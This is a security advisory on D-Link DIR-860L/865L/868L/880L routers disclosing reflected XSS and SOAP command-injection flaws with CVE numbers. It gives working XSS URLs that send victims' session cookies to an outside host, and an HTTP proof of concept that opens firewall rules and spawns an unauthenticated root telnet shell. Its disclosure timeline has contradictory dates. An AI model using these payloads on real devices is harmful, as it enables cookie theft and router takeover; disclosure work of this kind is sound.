## 0x00 Product Description
Dlink is a multinational networking equipment manufacturing corporation.

The Dlink 860L/865L/868L/880L are wireless "Cloud" Router.

The vulnerabilities details are as follows:

Vendor: D-Link

Devices: DIR-880 REVA / DIR-868 REVA / DIR-865 / DIR-860 REVA

Firmware:

DIR-880L_REVA_FIRMWARE_PATCH_1.08B04

DIR868LA1_FW112b04

DIR-865L_REVA_FIRMWARE_PATCH_1.08.B01

DIR860LA1_FW110b04

## 0x01 Vulnerabilities Summary
The Dlink 860L/865L/868L/880L is a router overall badly designed with a lot of vulnerabilities.

My research in analyzing the security of Dlink routers starts from a recent security contest organized by a security company.

## 0x02 The summary of the vulnerabilities is:
1. WAN && LAN - revA/B - XSS - CVE-2018-6527, CVE-2018-6528, CVE-2018-6529
2. LAN - revA/B - OS command injection - CVE-2018-6530

## 0x03 Details - WAN && LAN - revA/B - XSS

After analyzing PHP files inside /htdocs/webinc, I found several trivial XSS vulnerabilities.

An attacker can use the XSS to target an authenticated user in order to steal the authentication cookies.

1. xss inside /htdocs/webinc/body/bsc_sms_send.php
```php
[…]
                <span class="value">
                        <input id="receiver" type="text" size="50" maxlength="15" value="<? echo $_GET["receiver"]; ?>"/>
                </span>
[…]
```
An attacker could lure the victim to inadvertently open this vulnerable page as an authenticated user:
http://192.168.0.1/bsc_sms_send.php?receiver="><script>window.open('http://9.9.9.9:9999/cookie.asp?msg='+document.cookie)</script><"

2. xss inside /htdocs/ webinc/js/adv_parent_ctrl_map.php
```php
[…]
                var msgArray =
                [
                        '<?echo i18n("You have successfully configured your router to use OpenDNS Parental Control.");?>',
                        '<?echo i18n("Do you want to test the function?");?>',
                        '<p><input type="button" value="<?echo i18n('Test');?>" onclick="window.open(\'http://www.opendns.com/device/welcome/?device_id=<? echo $_GET["deviceid"];?>\')" /><input type="button" value="<?echo i18n('Return');?>" onClick="self.location.href=\'adv_parent_ctrl.php\';" /></p>'
                ];
                BODY.ShowMessage('<?echo i18n("OpenDNS PARENTAL CONTROLS");?>', msgArray);
[…]
```

An attacker could lure the victim to inadvertently open this vulnerable page as an authenticated user:
http://192.168.0.1/adv_parent_ctrl_map.php?deviceid=whatever\');window.open(\'http://9.9.9.9:9999/cookie.asp?msg=\'+document.cookie

3. xss inside /htdocs/ webinc/js/bsc_sms_inbox.php
```php
[…]
        InitValue: function(xml)
        {
                var get_Treturn = '<?if($_GET["Treturn"]=="") echo "0"; else echo $_GET["Treturn"];?>';		
         … 
        }
[…]
```
An attacker could lure the victim to inadvertently open this vulnerable page as an authenticated user:
http://192.168.0.1/bsc_sms_inbox.php?Treturn=0';window.open('http://9.9.9.9:9999/cookie.asp?msg='+document.cookie);get_Treturn='1

## 0x04 Details - LAN - revA/B - Command injection in SOAP controlType url interface

The vulnerability occurs in /htdocs/cgibin which is executed by the web server for, just handles almost http requests from WAN and LAN, and my research in analyzing SOAP interface started from a security analysis report regarding UPNP protocol, then I reviewed the SOAP interface, which is handled by the soapcgi_main function in cgibin, seems to have been mostly overlooked.

It should be noted that you could insert and execute malicious commands without privilege, meanwhile the injection point is the service field which is passed to soap.cgi to indicate control type, this exploitation also works even if invalid SOAPAction and whatever XML stream in a request.

Here’s the code in C to show some details about this issue:
```c
/* Grab a pointer to the request url */
requri = getenv("REQUEST_URI");
/* goto failure if the urquri does not start with "?service=" */
if((query = strchr(requri, "?")) == NULL or strncmp(query, "?service=", strlen("?service=")))
{
    goto failure_condition;
}
/* Point the control type field pointer 9 bytes beyond the requri */ 
controlType = query + strlen("?service=");

... ...

/* Create/open a shell script using the specified control type string */
sprintf(filename, "%s/%s_%d.sh", "/var/run", controlType, getpid());
fn = fopen(filename "a+");
/* Write self-deleting command into the srcipt and execute it by "sh -c"*/
if(fn)
{
    fprintf(fn, "rm -f %s/%s_%d.sh", "/var/run", controlType, getpid());
    fclose(fn);
    sprintf(filename, "%s/%s_%d.sh", "/var/run", controlType, getpid());
    system(filename);
}
```
Proof of concept:
```
POST /soap.cgi?service=whatever-control;iptables -P INPUT ACCEPT;iptables -P FORWARD ACCEPT;iptables -P OUTPUT ACCEPT;iptables -t nat -P PREROUTING ACCEPT;iptables -t nat -P OUTPUT ACCEPT;iptables -t nat -P POSTROUTING ACCEPT;telnetd -p 9999;whatever-invalid-shell HTTP/1.1
Host: 192.168.100.1:49152
Accept-Encoding: identity
Content-Length: 16
SOAPAction: "whatever-serviceType#whatever-action"
Content-Type: text/xml

whatever-content

Here, we can easily build a soap http request and embed malicious command that spawns a telnet server on WAN that provides an unauthenticated root shell into it, and then login into router using telnet:
$ telnet 9.9.9.9 9999
Trying 9.9.9.9...
Connected to 192.168.0.1.
Escape character is '^]'.
```
## 0x05 Report Timeline

Dec 8, 2017: Vulnerabilities found.
Jul 18, 2018: Reported to security@dlink.com.
Jul 18, 2018: The vendor followed up and made a schedule to fix it.
Feb 1, 2018: Reported those security issues to MITRE.
Feb 1, 2018: MITRE provides CVE-2018-6527, CVE-2018-6528, CVE-2018-6529, CVE-2018-6530.
Mar 1, 2018: The vendor release security announcement for customers.  
Mar 2, 2018: I decide to make a public disclosure.

## 0x06 Credits

These vulnerabilities were found by Kaixiang Zhang.

## 0x07 References

[](ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DIR-880L/REVA/DIR-880L_REVA_FIRMWARE_PATCH_NOTES_1.08B06_EN_WW.pdf)
[](ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DIR-865L/REVA/DIR-865L_REVA_FIRMWARE_PATCH_NOTES_1.10B01_EN_WW.pdf)
[](ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DIR-868L/REVA/DIR-868L_REVA_FIRMWARE_PATCH_NOTES_1.20B01_EN_WW.pdf)
[](ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/DIR-860L/REVA/DIR-860L_REVA_FIRMWARE_PATCH_NOTES_1.11B01_EN_WW.pdf)
